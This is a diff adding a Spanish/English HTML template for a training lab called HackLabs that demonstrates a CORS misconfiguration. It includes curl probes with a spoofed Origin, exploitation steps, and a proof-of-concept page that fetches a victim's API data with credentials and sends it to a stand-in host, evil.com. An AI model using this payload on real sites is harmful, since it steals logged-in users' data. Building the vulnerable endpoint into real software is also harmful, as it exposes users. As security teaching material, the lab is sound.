@@ -1,0 +1,92 @@
+{% extends "base.html" %}
+{% block title %}CORS Misconfiguration – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">
+      <i class="ph ph-globe text-sm"></i> API de datos internos
+    </div>
+    <p class="text-sm text-gray-400 mb-4">
+      La API devuelve datos sensibles y refleja cualquier cabecera <code>Origin</code> con
+      <code>Access-Control-Allow-Credentials: true</code>.
+    </p>
+    <div class="hl-code">
+      <div class="text-gray-400"># Endpoint vulnerable</div>
+      <div>GET /cors/data</div>
+      <div class="text-gray-400 mt-2"># Probar con curl (observa las cabeceras CORS)</div>
+      <div>curl -H "Origin: https://evil.com" -I http://localhost:5000/cors/data</div>
+    </div>
+    <button onclick="fetchCorsData()" class="btn-primary mt-4">
+      <i class="ph ph-arrow-square-out text-sm"></i> Hacer petición cross-origin
+    </button>
+    <div id="cors-result" class="hidden mt-4 p-3 rounded-lg border bg-dark-900 border-gray-700">
+      <div class="text-xs text-gray-400 mb-2">Respuesta:</div>
+      <pre id="cors-output" class="text-green-400 text-xs font-mono"></pre>
+    </div>
+  </div>
+
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-3 text-gray-400">PoC – Página maliciosa</div>
+    <div class="hl-code">
+      <div class="text-gray-400">&lt;!-- evil.com/steal.html --&gt;</div>
+      <div>&lt;script&gt;</div>
+      <div class="pl-4">fetch('http://victim.com/cors/data', {'{'}credentials:'include'{'}'})  </div>
+      <div class="pl-4">  .then(r =&gt; r.json())</div>
+      <div class="pl-4">  .then(d =&gt; fetch('https://evil.com/log?data='+JSON.stringify(d)));</div>
+      <div>&lt;/script&gt;</div>
+    </div>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Pasos de explotación</h3>
+    <ol>
+      <li>Verifica la misconfiguration con curl: la respuesta refleja tu <code>Origin</code> en <code>Access-Control-Allow-Origin</code> junto con <code>Access-Control-Allow-Credentials: true</code>.</li>
+      <li>Esto permite a cualquier sitio malicioso leer la respuesta incluyendo cookies de sesión.</li>
+      <li>Crea una página HTML en tu servidor y usa <code>fetch()</code> con <code>credentials: 'include'</code>.</li>
+      <li>Si la víctima visita tu página mientras tiene sesión abierta en la app, robarás sus datos.</li>
+    </ol>
+    <pre>curl -H "Origin: https://evil.com" \
+     -H "Cookie: session=VICTIM_SESSION" \
+     http://localhost:5000/cors/data
+# Observa: Access-Control-Allow-Origin: https://evil.com</pre>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Firefox DevTools</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation Steps</h3>
+    <ol>
+      <li>Verify the misconfiguration with curl: the response reflects your <code>Origin</code> in <code>Access-Control-Allow-Origin</code> along with <code>Access-Control-Allow-Credentials: true</code>.</li>
+      <li>This allows any malicious site to read the response including session cookies.</li>
+      <li>Create an HTML page on your server and use <code>fetch()</code> with <code>credentials: 'include'</code>.</li>
+      <li>If the victim visits your page while logged in, their data will be stolen.</li>
+    </ol>
+    <pre>curl -H "Origin: https://evil.com" \
+     -H "Cookie: session=VICTIM_SESSION" \
+     http://localhost:5000/cors/data
+# Notice: Access-Control-Allow-Origin: https://evil.com</pre>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Firefox DevTools</span></div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function fetchCorsData() {
+  fetch('/cors/data')
+    .then(r => r.json())
+    .then(d => {
+      document.getElementById('cors-output').textContent = JSON.stringify(d, null, 2);
+      document.getElementById('cors-result').classList.remove('hidden');
+    })
+    .catch(e => {
+      document.getElementById('cors-output').textContent = 'Error: ' + e;
+      document.getElementById('cors-result').classList.remove('hidden');
+    });
+}
+</script>
+{% endblock %}
